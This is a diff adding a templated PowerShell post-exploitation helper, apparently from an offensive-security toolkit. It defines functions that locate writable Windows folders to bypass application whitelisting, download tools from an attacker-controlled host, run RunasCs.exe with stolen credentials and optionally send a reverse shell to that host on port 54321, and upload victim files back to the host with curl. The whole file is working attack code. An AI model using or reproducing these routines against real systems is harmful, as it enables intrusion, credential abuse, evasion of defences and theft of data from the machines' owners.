@@ -1,0 +1,97 @@
+{% set url = 'http://{}{}'.format(
+    rhost, ':{}'.format(rport) if rport != 80 else '') %}
+
+
+function Bypass-Path {
+    $paths = @(
+        'C:\Windows\System32\spool\drivers\color',
+        'C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys',
+        'C:\Windows\Tasks',
+        'C:\Windows\tracing'
+    )
+
+    foreach ($path in $paths) {
+        if (Test-Path -Path "$path") {
+            return "$path"
+        }
+    }
+
+    Throw "Path bypass not found."
+}
+
+function Download-Files {
+    param(
+        [Parameter(Mandatory=$true, Position=0)]
+        [string[]] $Files,
+
+        [string] $Uri = '{{ url }}/dl'
+    )
+
+    foreach ($file in $Files) {
+        $destination = $file -Split '/' | select -Last 1
+
+        IWR -OutFile "$destination" -Uri "${Uri}/$($file.TrimStart('/'))" |
+            Out-Null
+    }
+}
+
+function RunAs-Command {
+    param(
+        [Parameter(Mandatory=$true, Position=0)]
+        [string] $Username,
+
+        [Parameter(Mandatory=$true, Position=1)]
+        [string] $Password,
+
+        [Parameter(Mandatory=$true, Position=2)]
+        [string] $Command,
+
+        [string] $Domain,
+
+        [string] $IPAddress = '{{ rhost }}',
+
+        [int] $LogonType,
+
+        [string] $Path = '.\RunasCs.exe',
+
+        [int] $Port = 54321,
+
+        [switch] $Remote
+    )
+
+    $command = "${Path} '${Username}' '${Password}' '${Command}'"
+
+    if ($PSBoundParameters.ContainsKey('Domain')) {
+        $command += " -d '${Domain}'"
+    }
+
+    if ($PSBoundParameters.ContainsKey('LogonType')) {
+        $command += " -l $LogonType"
+    }
+
+    if ($Remote) {
+        $command += " -r ${IPAddress}:${Port}"
+    }
+
+    IEX "$command"
+}
+
+function Upload-Files {
+    param (
+        [Parameter(Mandatory=$true, Position=0)]
+        [string[]] $Files,
+
+        [string] $Uri = '{{ url }}/ul'
+    )
+
+    $command = 'curl.exe -s'
+
+    foreach ($file in $Files) {
+        $command += " -F 'files=@${file}'"
+    }
+
+    $command += " ${Uri}"
+
+    IEX "$command"
+}
+
